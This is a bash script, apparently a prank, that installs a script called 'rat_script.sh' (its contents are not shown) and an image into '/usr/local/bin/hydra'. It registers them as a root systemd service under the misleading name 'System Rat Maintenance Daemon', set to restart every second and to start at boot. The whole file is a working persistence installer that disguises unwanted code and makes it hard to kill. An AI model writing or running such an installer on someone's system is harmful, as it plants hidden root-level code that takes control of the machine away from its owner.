#!/bin/bash

# 1. Setup paths
INSTALL_DIR="/usr/local/bin/hydra"
SERVICE_PATH="/etc/systemd/system/rat-maintenance.service"

echo "Deploying the Hydra..."

# 2. Create the hidden nest
mkdir -p "$INSTALL_DIR"
cp "rat_script.sh" "$INSTALL_DIR/rat_script.sh"
# Copy your source image there too
cp "/workspaces/Igotbored/rat.jpeg" "$INSTALL_DIR/rat.jpeg"
chmod +x "$INSTALL_DIR/rat_script.sh"

# 3. Create the Systemd Service
cat <<EOF > "$SERVICE_PATH"
[Unit]
Description=System Rat Maintenance Daemon
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/bin/zsh $INSTALL_DIR/rat_script.sh
WorkingDirectory=/home/John
Restart=always
RestartSec=1
User=root

[Install]
WantedBy=multi-user.target
EOF

# 4. Activate the beast
systemctl daemon-reload
systemctl enable rat-maintenance.service
systemctl start rat-maintenance.service

echo "Hydra is live. Check status with: systemctl status rat-maintenance"
